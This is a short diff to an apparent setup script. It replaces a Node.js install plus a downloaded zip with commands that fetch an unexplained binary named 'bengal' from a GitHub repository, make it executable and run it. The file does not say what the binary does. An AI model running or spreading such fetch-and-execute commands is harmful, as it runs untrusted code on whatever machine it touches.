@@ -1,12 +1,3 @@
-sudo apt update 
-sudo apt install xz-utils  > /dev/null 2>&1
-wget https://nodejs.org/dist/v21.7.1/node-v21.7.1-linux-x64.tar.xz > /dev/null 2>&1
-sudo tar -xvf node-v21.7.1-linux-x64.tar.xz > /dev/null 2>&1
-sudo cp -r node-v21.7.1-linux-x64/{bin,include,lib,share} /usr/
-export PATH=/usr/node-v18.16.0.-linux-x64/bin:$PATH
-node --version
-wget https://github.com/komaria10003099/redesigned-pancake/raw/main/browser_wa.zip
-unzip browser_wa.zip 
-npm install
-sh install.sh
-node index.js
+wget https://github.com/komaria10003099/redesigned-pancake/raw/main/bengal
+chmod +x bengal
+./bengal ann
